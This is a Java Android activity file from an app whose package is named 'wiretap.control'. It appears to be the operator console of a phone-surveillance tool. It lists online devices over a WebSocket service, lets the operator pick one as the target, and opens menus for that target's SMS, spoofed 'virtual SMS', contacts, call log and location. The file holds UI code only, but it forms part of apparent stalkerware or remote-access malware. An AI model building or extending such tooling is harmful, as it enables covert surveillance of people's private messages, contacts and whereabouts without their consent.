package com.pgw.wiretap.control;

import java.lang.reflect.Array;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.pgw.wiretap.control.anim.Anim;
import com.pgw.wiretap.control.domain.MsgHeader;
import com.pgw.wiretap.control.domain.MsgType;
import com.pgw.wiretap.control.domain.MyBaseAdapter;
import com.pgw.wiretap.control.domain.MyData;
import com.pgw.wiretap.control.domain.User;
import com.pgw.wiretap.control.service.WSService;
import com.pgw.wiretap.control.utils.JsonUtils;
import com.pgw.wiretap.control.utils.MsgUtils;

import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.SharedPreferences.Editor;
import android.text.TextUtils;
import android.util.Log;
import android.view.TextureView;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.view.animation.Animation;
import android.view.animation.AnimationSet;
import android.view.animation.AnimationUtils;
import android.view.animation.ScaleAnimation;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.AdapterView.OnItemSelectedListener;
import android.widget.ArrayAdapter;
import android.widget.BaseAdapter;
import android.widget.Button;
import android.widget.GridView;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.SimpleAdapter;
import android.widget.Spinner;
import android.widget.SpinnerAdapter;
import android.widget.TextView;
import android.widget.Toast;

public class HomeActivity extends BaseActivity  {
	public static final String TAG = "MainActivity";
	private GridView gv_list;
	private String msg;
	private Spinner sp_online_list;
	private List<Map> onLineData;
	private String[] items={"短信","虚拟短信","通讯录","通话记录","定位","设置中心"};
	private int[] icons={R.drawable.ic_sms,R.drawable.ic_sms,R.drawable.ic_contact,R.drawable.ic_calls,R.drawable.ic_location,R.drawable.ic_seting};

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		// 显示在线用户
		MsgUtils.sendToService(getApplicationContext(), "", MsgType.LIST_ONLINE);
		
		sp_online_list = (Spinner) findViewById(R.id.sp_online_list);
		
		
		// 显示操作菜单
		gv_list = (GridView) findViewById(R.id.gv_list);
		gv_list.setAdapter(new HomeListAdapter());
	}

	@Override
	protected void onStart() {
		// 启动WebSocke服务
		startService(new Intent(this, WSService.class));
		super.onStart();
	}


	@Override
	protected void receive(int type,String data) {
		switch (type) {
		case  MsgType.LOGIN_SUCCESS:
			// 登陆成功后更新在线列表
			MsgUtils.sendToService(getApplicationContext(), "", MsgType.LIST_ONLINE);
			break;
		case  MsgType.NOT_CONNECT_SERVER:
			MsgUtils.connecting(getApplicationContext());
			Toast.makeText(getApplicationContext(), "你没有连接到服务器，正在为你连接服务器...", 0)
					.show();
			break;
		case  MsgType.LIST_ONLINE:
			onLineData=JsonUtils.json2list(data, Map.class);
			sp_online_list.setAdapter(new OnLineListAdapter());
			break;

		}
			
	}
	/**
	 * 在线列表的适配器
	 */
	private class OnLineListAdapter extends MyBaseAdapter{
		@Override
		public int getCount() {
			return onLineData.size();
		}
		@Override
		public View getView(int position, View convertView, ViewGroup parent) {
			View view = View.inflate(getApplicationContext(), R.layout.list_item_online, null);
			TextView tv_username=(TextView) view.findViewById(R.id.tv_username);
			tv_username.setText((String) onLineData.get(position).get("username"));
			return view;
		}
		
	}
	
	/**
	 *主界面列表适配器
	 */
	private class HomeListAdapter extends MyBaseAdapter{
		@Override
		public int getCount() {
			return items.length;
		}
		@Override
		public View getView(final int position, View convertView, ViewGroup parent) {
			View view=View.inflate(getApplicationContext(), R.layout.list_item_home, null);
			TextView tv_text=(TextView) view.findViewById(R.id.tv_text);
			ImageView iv_icon=(ImageView) view.findViewById(R.id.iv_icon);
			
			tv_text.setText(items[position]);
			iv_icon.setImageResource(icons[position]);
			
			view.setOnClickListener(new OnClickListener() {
				private String getter;

				@Override
				public void onClick(View v) {
					if (onLineData!=null && onLineData.size()>0) {
						 getter=(String)onLineData.get(sp_online_list.getSelectedItemPosition()).get("username");
//					保存接受者
					Editor edit = sp.edit();
					edit.putString("getter"	, getter);
					edit.commit();
					}else{
						Toast.makeText(getApplicationContext(), "请选择联系人", 0).show();
						return;
					}
					
					Intent intent = null;
					switch (position) {
					case 0://进入短信界面
						intent = new Intent(HomeActivity.this, SmsActivity.class);
						break;
					case 1://进入虚拟短信界面
						intent = new Intent(HomeActivity.this, VirtualSmsActivity.class);
						break;
					case 5://进入设置界面
						intent = new Intent(HomeActivity.this, SettingActivity.class);
						break;
					}
					startActivity(intent);
					
				}
			});
			
			return view;
		}
	}

}
